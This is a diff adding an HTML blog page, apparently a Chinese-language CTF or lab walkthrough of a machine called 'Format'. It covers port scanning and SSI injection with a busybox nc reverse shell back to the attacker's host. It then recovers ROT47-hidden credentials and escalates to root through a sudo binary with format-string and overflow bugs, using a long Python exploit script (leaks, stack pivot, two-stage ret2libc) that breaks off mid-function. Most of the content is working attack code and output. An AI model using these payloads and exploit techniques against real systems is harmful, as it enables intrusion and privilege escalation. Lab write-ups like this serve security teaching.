@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 信息收集
+
+老规矩，先用 `arp-scan` 扫一下网段里的活靶子。">
+<meta property="og:title" content="内部_Format">
+<meta property="og:description" content="# 信息收集
+
+老规矩，先用 `arp-scan` 扫一下网段里的活靶子。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Format.html">
+<meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
+<title>内部_Format</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Format</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/292" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集</h1>
+<p>老规矩，先用 <code>arp-scan</code> 扫一下网段里的活靶子。</p>
+<pre lang="bash"><code>sudo arp-scan -l
+</code></pre>
+<p>很快就锁定了目标 IP <code>192.168.205.188</code>。</p>
+<pre><code>Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
+192.168.205.131 00:0c:29:c3:54:95       VMware, Inc.
+192.168.205.188 08:00:27:4e:d1:bc       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:e0:e2:35       VMware, Inc.
+...
+</code></pre>
+<p>接着 <code>nmap</code> 全端口扫描，看看上面跑了些什么服务。</p>
+<pre lang="bash"><code>nmap -p0-65535 192.168.205.188
+</code></pre>
+<p>结果很清爽，就开了 22 和 80 端口。SSH 先放着，Web 服务是首选突破口。</p>
+<pre><code>Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-27 23:20 -0400
+Nmap scan report for 192.168.205.188
+Host is up (0.00033s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:4E:D1:BC (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.03 seconds
+</code></pre>
+<h1>初始突破：SSI 注入</h1>
+<p>直接用 <code>curl</code> 访问 80 端口，看看是什么页面。</p>
+<pre lang="bash"><code>curl http://192.168.205.188
+</code></pre>
+<p>返回一个看起来像系统监控后台的页面，风格很复古。</p>
+<pre lang="html"><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Legacy Maintenance Console&lt;/title&gt;
+    ...
+    &lt;script&gt;
+        ...
+            fetch('comments.shtml')
+            .then(response =&gt; response.ok ? response.text() : '')
+            .then(data =&gt; {
+                const logBox = document.querySelector('.log-box');
+                logBox.innerHTML = data ? `[${new Date().toLocaleString()}] ${data}` : '[2026-02-16 11:54:46] SYSTEM INITIALIZED&lt;br&gt;[2026-02-16 11:55:10] NODE CONNECTION VERIFIED';
+            });
+        ...
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;FORMAT - System Monitor v1.0.4&lt;/h1&gt;
+        ...
+        &lt;form action=&quot;post.php&quot; method=&quot;POST&quot;&gt;
+            &lt;p&gt;Append Activity Log:&lt;/p&gt;
+            &lt;textarea name=&quot;comment&quot; rows=&quot;4&quot;&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;SUBMIT DATA&quot;&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>源码里有几个关键点：</p>
+<ol>
+<li>页面通过 <code>fetch('comments.shtml')</code> 加载日志内容，主页本身也是 <code>.shtml</code> 后缀。这强烈暗示了服务器端包含（SSI）。</li>
+<li>有个表单，可以向 <code>post.php</code> 提交 <code>comment</code> 数据。</li>
+</ol>
+<p>逻辑很清晰了：<code>post.php</code> 接收 <code>comment</code> 参数，然后把它写进 <code>comments.shtml</code> 文件里。既然是 <code>.shtml</code> 文件，那就有机会执行 SSI 指令。</p>
+<p>直接构造一个 SSI payload，尝试执行 <code>id</code> 命令。</p>
+<pre lang="bash"><code>curl -X POST http://192.168.205.188/post.php --data-urlencode 'comment=&lt;!--#exec cmd=&quot;id&quot; --&gt;'
+</code></pre>
+<p>提交之后，访问 <code>comments.shtml</code> 看看命令是否被执行。</p>
+<pre lang="bash"><code>curl http://192.168.205.188/comments.shtml
+</code></pre>
+<p>成功了，页面返回了 <code>id</code> 命令的执行结果。</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>既然能执行命令，下一步就是拿 shell。用 <code>busybox nc</code> 弹个反向 shell 回来。</p>
+<pre lang="bash"><code>curl -X POST http://192.168.205.188/post.php --data-urlencode 'comment=&lt;!--#exec cmd=&quot;busybox nc 192.168.205.128 8888 -e /bin/bash&quot; --&gt;'
+</code></pre>
+<p>在 Kali 上开好监听。</p>
+<pre lang="bash"><code>nc -lvnp 8888
+</code></pre>
+<p>提交 payload 后，再访问一次 <code>comments.shtml</code> 来触发命令。</p>
+<pre lang="bash"><code>curl http://192.168.205.188/comments.shtml
+</code></pre>
+<p>监听端立刻收到了连接，拿到了一个 <code>www-data</code> 权限的 shell。</p>
+<pre><code>listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.188] 55876
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h1>权限提升</h1>
+<h2>www-data -&gt; andeli</h2>
+<p>拿到 shell 后第一件事是搞个好用的终端。</p>
+<pre lang="bash"><code>script /dev/null -c bash
+# Ctrl+Z
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=/bin/bash
+stty rows 36 columns 178
+</code></pre>
+<p>在 Web 目录下翻翻，看看有什么线索。</p>
+<pre lang="bash"><code>www-data@Format:/var/www/html$ ls -la
+total 20
+drwxr-xr-x 2 root     root     4096 Feb 21 22:55 .
+drwxr-xr-x 3 root     root     4096 Jan 30 09:21 ..
+-rw-rw-rw- 1 www-data www-data   64 May 27 22:23 comments.shtml
+-rw-r--r-- 1 root     root     2161 Feb 15 21:56 index.shtml
+-rw-r--r-- 1 root     root      157 Feb 20 09:39 post.php
+</code></pre>
+<p>之前利用的 <code>post.php</code> 引起了我的注意，看看里面写了什么。</p>
+<pre lang="bash"><code>www-data@Format:/var/www/html$ cat post.php
+&lt;?php
+$data = $_POST['comment'];
+file_put_contents(&quot;comments.shtml&quot;, $data);
+header(&quot;Location: index.shtml&quot;);
+exit();
+// rot47
+// 2?56=:iC&quot;tKHsKF6!@x}&amp;&amp;:
+?&gt;
+</code></pre>
+<p>代码逻辑很简单，就是把 POST 过来的 <code>comment</code> 数据写入文件。但下面注释里有个 <code>rot47</code> 和一串奇怪的字符，这明显是线索。</p>
+<p>用 CyberChef 之类的工具，对 <code>2?56=:iC&quot;tKHsKF6!@x}&amp;&amp;:</code> 做 ROT47 解码，得到一组凭据：<code>andeli:rQEzwDzuePoINUUi</code>。</p>
+<p>尝试用这组凭据切换用户。</p>
+<pre lang="bash"><code>www-data@Format:/var/www/html$ su andeli
+Password: 
+andeli@Format:/var/www/html$ id
+uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
+</code></pre>
+<p>成功切换到 <code>andeli</code> 用户。</p>
+<h2>andeli -&gt; root</h2>
+<p>作为新用户，第一反应就是看看 <code>sudo -l</code> 有没有意外之喜。</p>
+<pre lang="bash"><code>andeli@Format:/var/www/html$ sudo -l
+Matching Defaults entries for andeli on Format:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User andeli may run the following commands on Format:
+    (ALL) NOPASSWD: /usr/local/bin/format
+</code></pre>
+<p><code>andeli</code> 可以免密以 root 权限执行 <code>/usr/local/bin/format</code>。接下来就是分析这个二进制了。</p>
+<h3>format 二进制分析</h3>
+<blockquote>
+<p><em>ps:我拉到本地了，所以在本地调试</em></p>
+</blockquote>
+<p>先看基本属性。</p>
+<pre lang="bash"><code>file ./format
+readelf -h ./format
+readelf -l ./format
+</code></pre>
+<p>关键结论：</p>
+<ul>
+<li>ELF32 i386，小端，动态链接。</li>
+<li><code>Type: EXEC</code>，无 PIE，程序本体地址固定在 <code>0x08048000</code> 附近。</li>
+<li><code>GNU_STACK</code> 为 <code>RW</code>，没有执行权限，栈不可执行，得走 ret2libc/ROP。</li>
+<li>Partial RELRO，GOT 可写。</li>
+</ul>
+<p>反编译得到的主函数伪代码：</p>
+<pre lang="c"><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char format[100]; // [esp+0h] [ebp-78h] BYREF
+  int v5; // [esp+64h] [ebp-14h]
+  int v6; // [esp+68h] [ebp-10h]
+  int v7; // [esp+6Ch] [ebp-Ch]
+
+  v7 = 1;
+  v6 = 572662306;
+  v5 = 1;
+  __isoc99_scanf((int)&amp;unk_8048560, (int)format);
+  printf(&quot;%08x.%08x.%08x.%s\n&quot;, v7, v6, v5, format);
+  printf(format);
+  return 0;
+}
+</code></pre>
+<p><code>.rodata</code> 中 <code>0x08048560</code> 是 <code>&quot;%s&quot;</code>，所以就是 <code>scanf(&quot;%s&quot;, format)</code>。这里同时存在两个问题：</p>
+<ol>
+<li><code>scanf(&quot;%s&quot;)</code> 没有限制长度，<code>format[100]</code> 可被溢出。</li>
+<li><code>printf(format)</code> 直接把用户输入当格式串，存在格式化字符串漏洞。</li>
+</ol>
+<h3>栈迁移和利用原语</h3>
+<p><code>main</code> 的关键汇编片段：</p>
+<pre lang="asm"><code>0804846b &lt;main&gt;:
+ 804846b: 8d 4c 24 04        lea    ecx,[esp+0x4]
+ 804846f: 83 e4 f0           and    esp,0xfffffff0
+ 8048472: ff 71 fc           push   DWORD PTR [ecx-0x4]
+ 8048475: 55                 push   ebp
+ 8048476: 89 e5              mov    ebp,esp
+ 8048478: 51                 push   ecx
+ 8048479: 83 ec 74           sub    esp,0x74
+  ...
+ 80484d6: 8b 4d fc           mov    ecx,DWORD PTR [ebp-0x4]
+ 80484d9: c9                 leave
+ 80484da: 8d 61 fc           lea    esp,[ecx-0x4]
+ 80484dd: c3                 ret
+</code></pre>
+<p><code>format</code> 缓冲区在 <code>[ebp-0x78]</code>，保存的 <code>ecx</code> 在 <code>[ebp-0x4]</code>，两者相差 <code>0x74 = 116</code> 字节。函数返回时执行 <code>lea esp, [ecx-4]; ret</code>，所以只要把保存的 <code>ecx</code> 改成 <code>.bss</code> 上的地址，就能把 <code>esp</code> 迁移过去，从 <code>.bss</code> 上取返回地址执行 ROP。</p>
+<p>格式化字符串方面，<code>printf(format)</code> 只传了一个参数，但用户输入本身就在栈上。输入开头的 4 字节可以作为格式化字符串的第 4 个参数读取，所以能用 <code>%4$.4s</code> 做任意地址泄露，用 <code>%N$hn</code> 做任意地址半字写。</p>
+<p>可用的三个原语：</p>
+<ol>
+<li><strong>任意地址泄露</strong>：把 GOT 地址放到输入中，用 <code>%4$.4s</code> 读出 4 字节。</li>
+<li><strong>任意地址半字写</strong>：把目标地址放到输入中，用 <code>%N$hn</code> 写入当前输出长度的低 16 位。</li>
+<li><strong>栈迁移</strong>：通过溢出覆盖保存的 <code>ecx</code>，让 <code>main</code> 返回时 <code>esp</code> 指向 <code>.bss</code> ROP 链。</li>
+</ol>
+<h3>两阶段 ROP 方案</h3>
+<p>由于 NX 开启，不能直接打 shellcode，最终方案是两阶段 ROP。</p>
+<p><strong>Stage 1</strong> —— 一次输入同时完成：</p>
+<ul>
+<li>泄露 <code>__libc_start_main@got</code>（<code>0x0804a010</code>）和 <code>__isoc99_scanf@got</code>（<code>0x0804a014</code>）。</li>
+<li>用格式化字符串 <code>%hn</code> 把第一段 ROP 链和一个 <code>&quot; %[^\n]&quot;</code> 格式串写到 <code>.bss</code>。</li>
+<li>覆盖保存的 <code>ecx</code>，把返回路径 pivot 到 <code>.bss</code> 的 ROP 链上。</li>
+</ul>
+<p>写入 <code>.bss</code> 的第一段 ROP 布局：</p>
+<pre lang="text"><code>ROP_SCRATCH + 0x00: scanf@plt
+ROP_SCRATCH + 0x04: pop2_ret
+ROP_SCRATCH + 0x08: SCANSET_FMT     (&quot; %[^\n]&quot; 的地址)
+ROP_SCRATCH + 0x0c: CHAIN2_SCRATCH
+ROP_SCRATCH + 0x10: pop_ebp_ret
+ROP_SCRATCH + 0x14: CHAIN2_SCRATCH
+ROP_SCRATCH + 0x18: leave_ret
+</code></pre>
+<p>执行效果就是 <code>scanf(&quot; %[^\n]&quot;, CHAIN2_SCRATCH)</code>，然后把 <code>ebp</code> 设置到 <code>CHAIN2_SCRATCH</code>，再通过 <code>leave; ret</code> 切换到第二阶段链。</p>
+<p>这里用 <code>&quot; %[^\n]&quot;</code> 而不是原程序里的 <code>&quot;%s&quot;</code> 是有讲究的——<code>%s</code> 遇到空白字符就截断，而 <code>&quot; %[^\n]&quot;</code> 会先跳过残留换行，再读取直到下一次换行，这样 stage2 payload 里基本只需要避开 <code>0x0a</code>。</p>
+<p>脚本会用两个泄露值交叉校验 libc 基址：</p>
+<pre lang="python"><code>base1 = leak_libc_start_main - off_libc_start_main
+base2 = leak_scanf - off_scanf
+</code></pre>
+<p>只有 <code>base1 == base2</code> 时才继续。</p>
+<p><strong>Stage 2</strong> —— 经典 ret2libc：</p>
+<pre lang="python"><code>payload = p32(0x41414141)          # fake ebp
+payload += p32(system_addr)        # system
+payload += p32(0x42424242)         # fake return
+payload += p32(CHAIN2_SCRATCH + 16)  # arg -&gt; &quot;/bin/sh&quot;
+payload += b&quot;/bin/sh&quot;
+</code></pre>
+<p>第一阶段 ROP 执行 <code>scanf</code> 读入这段 payload 后，<code>leave; ret</code> 把控制流交给 <code>system(&quot;/bin/sh&quot;)</code>。因为 <code>format</code> 是通过 <code>sudo</code> 执行的，所以得到的就是 root shell。</p>
+<h3>利用执行</h3>
+<p>整个过程涉及地址计算、ASLR、ROP 链构建，手动操作很繁琐，所以写了一个 Python 脚本来自动化。脚本包含 libc 自动识别和 64 次重试逻辑，用来处理 ASLR 下偶发的地址坏字节问题。</p>
+<blockquote>
+<p>ps:有些本地测试的冗余代码可以del。自己解决一下吧，我没del。能跑的就是好代码。</p>
+</blockquote>
+<pre lang="python"><code>#!/usr/bin/env python3
+import argparse
+import re
+import select
+import socket
+import struct
+import subprocess
+import sys
+import time
+from typing import Optional
+
+
+GOT_LIBC_START_MAIN = 0x0804A010
+GOT_SCANF = 0x0804A014
+
+SCANF_PLT = 0x08048350
+SCANF_FMT = 0x08048560
+POP2_RET = 0x0804853A
+POP_EBP_RET = 0x0804853B
+LEAVE_RET = 0x080483D8
+
+ROP_SCRATCH = 0x0804AF40
+SCANSET_FMT = 0x0804AFA0
+CHAIN2_SCRATCH = 0x0804AFC0
+SAVED_ECX_OFFSET = 116
+
+FALLBACK_LIBC_PROFILES = [
+    {
+        &quot;name&quot;: &quot;glibc-2.23-ubuntu16-i386&quot;,
+        &quot;off_libc_start_main&quot;: 0x18540,
+        &quot;off_scanf&quot;: 0x53D10,
+        &quot;off_system&quot;: 0x3A940,
+        &quot;off_exit&quot;: 0x2E7B0,
+        &quot;off_bin_sh&quot;: 0x15900B,
+    },
+    {
+        &quot;name&quot;: &quot;glibc-2.31-ubuntu20-i386-local&quot;,
+        &quot;off_libc_start_main&quot;: 0x25F70,
+        &quot;off_scanf&quot;: 0x5B0A0,
+        &quot;off_system&quot;: 0x537F0,
+        &quot;off_exit&quot;: 0x400C0,
+        &quot;off_bin_sh&quot;: 0x1C8E52,
+    },
+]
+
+LEAK_RE = re.compile(rb&quot;L1(.{4})L2(.{4})L3STK([0-9a-fA-F]{8})STK&quot;, re.S)
+BAD_STAGE1_BYTES = b&quot;\x00\x09\x0a\x0b\x0c\x0d\x20&quot;
+BAD_STAGE2_BYTES = b&quot;\x0a&quot;
+DEFAULT_LOCAL_ARGV = [&quot;sudo&quot;, &quot;-n&quot;, &quot;/usr/local/bin/format&quot;]
+TEST_LOCAL_ARGV = [&quot;./format&quot;]
+
+
+def p32(value: int) -&gt; bytes:
+    return struct.pack(&quot;&lt;I&quot;, value &amp; 0xFFFFFFFF)
+
+
+def u32(data: bytes) -&gt; int:
+    return struct.unpack(&quot;&lt;I&quot;, data)[0]
+
+
+def has_bad_bytes(data: bytes, bad_bytes: bytes) -&gt; bool:
+    return any(byte in bad_bytes for byte in data)
+
+
+def parse_local_libc_profile(binary_path: str):
+    ldd = subprocess.run(
+        [&quot;ldd&quot;, binary_path],
+        check=True,
+        capture_output=True,
+        text=True,
+    )
+
+    libc_path = None
+    for line in ldd.stdout.splitlines():
+        if &quot;libc.so.6&quot; in line and &quot;=&gt;&quot; in line:
+            libc_path = line.split(&quot;=&gt;&quot;, 1)[1].strip().split()[0]
+            break
+    if libc_path is None:
+        raise RuntimeError(f&quot;failed to locate libc for {binary_path}&quot;)
+
+    readelf = subprocess.run(
+        [&quot;readelf&quot;, &quot;-sW&quot;, libc_path],
+        check=True,
+        capture_output=True,
+        text=True,
+    )
+    strings = subprocess.run(
+        [&quot;strings&quot;, &quot;-a&quot;, &quot;-tx&quot;, libc_path],
+        check=True,
+        capture_output=True,
+        text=True,
+    )
+
+    profile = {&quot;name&quot;: f&quot;auto:{libc_path}&quot;}
+    symbol_patterns = {
+        &quot;off_libc_start_main&quot;: r&quot;^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+__libc_start_main@@&quot;,
+        &quot;off_scanf&quot;: r&quot;^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+__isoc99_scanf@@&quot;,
+        &quot;off_system&quot;: r&quot;^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+system@@&quot;,
+        &quot;off_exit&quot;: r&quot;^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\d+\s+exit@@&quot;,
+    }
+    for key, pattern in symbol_patterns.items():
+        match = re.search(pattern, readelf.stdout, re.M)
+        if match is None:
+            raise RuntimeError(f&quot;failed to resolve {key} from {libc_path}&quot;)
+        profile[key] = int(match.group(1), 16)
+
+    bin_sh = re.search(r&quot;^\s*([0-9a-fA-F]+)\s+/bin/sh$&quot;, strings.stdout, re.M)
+    if bin_sh is None:
+        raise RuntimeError(f&quot;failed to resolve /bin/sh from {libc_path}&quot;)
+    profile[&quot;off_bin_sh&quot;] = int(bin_sh.group(1), 16)
+    return profile
+
+
+class LocalTube:
+    def __init__(self, argv):
+        self.proc = subprocess.Popen(
+            argv,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+        )
+
+    def send(self, data: bytes) -&gt; None:
+        assert self.proc.stdin is not None
+        self.proc.stdin.write(data)
+        self.proc.stdin.flush()
+
+    def recv_until(self, predicate, timeout: float) -&gt; bytes:
+        assert self.proc.stdout is not None
+        out = b&quot;&quot;
+        end = time.time() + timeout
+        while time.time() &lt; end:
+            ready, _, _ = select.select([self.proc.stdout], [], [], 0.05)
+            if ready:
+                chunk = self.proc.stdout.read1(8192)
+                if not chunk:
+                    break
+                out += chunk
+                if predicate(out):
+                    break
+            elif self.proc.poll() is not None:
+                break
+        return out
+
+    def recv_some(self, timeout: float) -&gt; bytes:
+        return self.recv_until(lambda _: False, timeout)
+
+    def drain_quiet(self, quiet_time: float, max_time: float) -&gt; bytes:
+        assert self.proc.stdout is not None
+        out = b&quot;&quot;
+        end = time.time() + max_time
+        last_data = time.time()
+        while time.time() &lt; end:
+            ready, _, _ = select.select([self.proc.stdout], [], [], 0.05)
+            if ready:
+                chunk = self.proc.stdout.read1(8192)
+                if not chunk:
+                    break
+                out += chunk
+                last_data = time.time()
+            elif time.time() - last_data &gt;= quiet_time:
+                break
+        return out
+
+    def interactive(self) -&gt; None:
+        assert self.proc.stdin is not None and self.proc.stdout is not None
+        try:
+            while True:
+                ready, _, _ = select.select([self.proc.stdout, sys.stdin.buffer], [], [])
+                if self.proc.stdout in ready:
+                    chunk = self.proc.stdout.read1(8192)
+                    if not chunk:
+                        break
+                    sys.stdout.buffer.write(chunk)
+                    sys.stdout.buffer.flush()
+                if sys.stdin.buffer in ready:
+                    data = sys.stdin.buffer.read1(8192)
+                    if not data:
+                        break
+                    self.proc.stdin.write(data)
+                    self.proc.stdin.flush()
+        finally:
+            self.close()
+
+    def close(self) -&gt; None:
+        if self.proc.poll() is None:
+            self.proc.kill()
+            self.proc.wait()
+
+
+class RemoteTube:
+    def __init__(self, host: str, port: int):
+        self.sock = socket.create_connection((host, port))
+        self.sock.setblocking(False)
+
+    def send(self, data: bytes) -&gt; None:
+        self.sock.sendall(data)
+
+    def recv_until(self, predicate, timeout: float) -&gt; bytes:
+        out = b&quot;&quot;
+        end = time.time() + timeout
+        while time.time() &lt; end:
+            ready, _, _ = select.select([self.sock], [], [], 0.05)
+            if ready:
+                chunk = self.sock.recv(8192)
+                if not chunk:
+                    break
+                out += chunk
+                if predicate(out):
+                    break
+        return out
+
+    def recv_some(self, timeout: float) -&gt; bytes:
+        return self.recv_until(lambda _: False, timeout)
+
+    def drain_quiet(self, quiet_time: float, max_time: float) -&gt; bytes:
+        out = b&quot;&quot;
+        end = time.time() + max_time
+        last_data = time.time()
+        while time.time() &lt; end:
+            ready, _, _ = select.select([self.sock], [], [], 0.05)
+            if ready:
+                chunk = self.sock.recv(8192)
+                if not chunk:
+                    break
+                out += chunk
+                last_data = time.time()
+            elif time.time() - last_data &gt;= quiet_time:
+                break
+        return out
+
+    def interactive(self) -&gt; None:
+        try:
+            while True:
+                ready, _, _ = select.select([self.sock, sys.stdin.buffer], [], [])
+                if self.sock in ready:
+                    chunk = self.sock.recv(8192)
+                    if not chunk:
+                        break
+                    sys.stdout.buffer.write(chunk)
+                    sys.stdout.buffer.flush()
+                if sys.stdin.buffer in ready:
+                    data = sys.stdin.buffer.read1(8192)
+                    if not data:
+                        break
+                    self.sock.sendall(data)
+        finally:
+            self.close()
+
+    def close(self) -&gt; None:
+        self.sock.close()
+
+
+def build_fmt_with_pivot(prefix_args, writes, pivot_value):
+    items = []
+    for addr, value in writes.items():
+        items.append((addr, value &amp; 0xFFFF))
+        items.append((addr + 2, (value &gt;&gt; 16) &amp; 0xFFFF))
+
+    prefix = b&quot;&quot;.join(p32(arg) for arg in prefix_args)
+    prefix += b&quot;&quot;.join(p32(addr) for addr, _ in items)
+
+    buf = bytearray(prefix)
+    printed = len(prefix)
+    by_halfword = {}
+    start_index = 4 + len(prefix_args)
+
+    for index, (_, halfword) in enumerate(items, start=start_index):
+        by_halfword.setdefault(halfword, []).append(index)
+
+    inserted = False
+    for halfword in sorted(by_halfword):
+        def build_chunk(current_count: int) -&gt; bytes:
+            pad = (halfword - current_count) &amp; 0xFFFF
+            chunk = b&quot;&quot;
+            if pad:
+                chunk += f&quot;%{pad}c&quot;.encode()
+            for arg_index in by_halfword[halfword]:
+                chunk += f&quot;%{arg_index}$hn&quot;.encode()
+            return chunk
+
+        chunk = build_chunk(printed)
+        if not inserted and len(buf) + len(chunk) &gt; SAVED_ECX_OFFSET:
+            filler_len = SAVED_ECX_OFFSET - len(buf)
+            if filler_len &lt; 0:
+                raise ValueError(&quot;pivot insertion missed saved ecx slot&quot;)
+            buf.extend(b&quot;B&quot; * filler_len)
+            buf.extend(p32(pivot_value))
+            printed = (printed + filler_len + 4) &amp; 0xFFFF
+            inserted = True
+            chunk = build_chunk(printed)
+
+        buf.extend(chunk)
+        printed = halfword
+
+    if not inserted:
+        filler_len = SAVED_ECX_OFFSET - len(buf)
+        if filler_len &lt; 0:
+            raise ValueError(&quot;format payload overflowed saved ecx slot&quot;)
+        buf.extend(b&quot;B&quot; * filler_len)
+        buf.extend(p32(pivot_value))
+
+    if has_bad_bytes(buf, BAD_STAGE1_BYTES):
+        raise ValueError(&quot;stage1 payload contains scanf-terminating bytes&quot;)
+    return bytes(buf)
+
+
+def build_stage1() -&gt; bytes:
+    rop_writes = {
+        ROP_SCRATCH: SCANF_PLT,
+        ROP_SCRATCH + 4: POP2_RET,
+        ROP_SCRATCH + 8: SCANSET_FMT,
+        ROP_SCRATCH + 12: CHAIN2_SCRATCH,
+        ROP_SCRATCH + 16: POP_EBP_RET,
+        ROP_SCRATCH + 20: CHAIN2_SCRATCH,
+        ROP_SCRATCH + 24: LEAVE_RET,
+        SCANSET_FMT: 0x5E5B2520,
+        SCANSET_FMT + 4: 0x00005D0A,
+    }
+    fmt = build_fmt_with_pivot([GOT_LIBC_START_MAIN, GOT_SCANF], rop_writes, ROP_SCRATCH + 4)
+    fmt += b&quot;L1%4$.4sL2%5$.4sL3STK%1$08xSTK%50000c&quot;
+    if fmt[SAVED_ECX_OFFSET:SAVED_ECX_OFFSET + 4] != p32(ROP_SCRATCH + 4):
+        raise ValueError(&quot;saved ecx pivot not placed correctly&quot;)
+    return fmt + b&quot;\x00\n&quot;
+
+
+def build_stage2_chain(libc_base: int, profile) -&gt; bytes:
+    system_addr = libc_base + profile[&quot;off_system&quot;]
+    shell_str_addr = CHAIN2_SCRATCH + 16
+
+    payload = p32(0x41414141)
+    payload += p32(system_addr)
+    payload += p32(0x42424242)
+    payload += p32(shell_str_addr)
+    payload += b&quot;/bin/sh&quot;
+
+    if has_bad_bytes(payload, BAD_STAGE2_BYTES):
+        sys.stderr.write(
+            &quot;[!] bad stage2 bytes: &quot;
+            f&quot;system=0x{system_addr:08x}, shell_str=0x{shell_str_addr:08x}, &quot;
+            f&quot;payload={payload.hex()}\n&quot;
+        )
+        sys.stderr.flush()
+        return b&quot;&quot;
+    return payload + b&quot;\n&quot;
+
+
+def exploit_once(tube, libc_profiles, post_cmd: Optional[bytes] = None) -&gt; bool:
+    tube.send(build_stage1())
+    leak_blob = tube.recv_until(lambda data: LEAK_RE.search(data) is not None, timeout=10.0)
+    match = LEAK_RE.search(leak_blob)
+    if not match:
+        raise RuntimeError(&quot;failed to capture stage1 leaks&quot;)
+
+    leak_libc_start_main = u32(match.group(1))
+    leak_scanf = u32(match.group(2))
+    stack_buf = int(match.group(3), 16)
+    sys.stderr.write(
+        f&quot;[+] raw leaks: __libc_start_main=0x{leak_libc_start_main:08x}, &quot;
+        f&quot;__isoc99_scanf=0x{leak_scanf:08x}, stack_buf=0x{stack_buf:08x}\n&quot;
+    )
+    sys.stderr.flush()
+
+    matched_profile = None
+    libc_base = None
+    for profile in libc_profiles:
+        base1 = leak_libc_start_main - profile[&quot;off_libc_start_main&quot;]
+        base2 = leak_scanf - profile[&quot;off_scanf&quot;]
+        if base1 == base2:
+            matched_profile = profile
+            libc_base = base1
+            break
+
+    if matched_profile is None:
+        bases = []
+        for profile in libc_profiles:
+            base1 = leak_libc_start_main - profile[&quot;off_libc_start_main&quot;]
+            base2 = leak_scanf - profile[&quot;off_scanf&quot;]
+            bases.append(
+                f&quot;{profile['name']}: main=0x{base1:08x}, scanf=0x{base2:08x}&quot;
+            )
+        raise RuntimeError(&quot;libc base mismatch between leaks; candidates: &quot; + &quot; | &quot;.join(bases))
+
+    sys.stderr.write(
+        f&quot;[+] libc profile = {matched_profile['name']}, libc_base = 0x{libc_base:08x}\n&quot;
+    )
+    sys.stderr.flush()
+
+    stage2 = build_stage2_chain(libc_base, matched_profile)
